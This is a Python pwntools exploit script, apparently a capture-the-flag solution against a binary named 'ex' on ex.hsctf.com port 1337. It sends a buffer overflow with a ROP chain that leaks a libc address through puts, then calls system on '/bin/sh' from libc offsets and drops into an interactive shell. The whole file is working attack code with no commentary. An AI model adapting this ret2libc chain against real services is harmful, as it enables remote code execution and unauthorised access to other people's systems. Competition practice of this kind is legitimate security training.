#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("ex")
libc = ELF("./libc-2.31-4-x86.so")

local = False 
if local:
    p = process("./ex")
    gdb.attach(p,'''c''')
else:
    p = remote('ex.hsctf.com', 1337)

elf = context.binary = ELF('./ex', checksec=False)

puts = 0x0000000000401100
gets_got = 0x404058
rdi = 0x00000000004014f3
main = 0x0000000000401276
payload = cyclic(0x28) + p64(rdi) + p64(gets_got) + p64(puts) + p64(main)
p.sendline(payload)
p.sendline(b'Q')
p.recvuntil(b'?\n')
libc = int.from_bytes(p.recv(6), 'little') - 0x82630    
log.info('Libc_addr: ' + hex(libc))

payload = cyclic(0x28) + p64(0x000000000040101a)+ p64(rdi) + p64(libc + 0x1b45bd) + p64(libc + 0x52290)
p.sendline(payload)
p.sendline(b'Q')

p.interactive()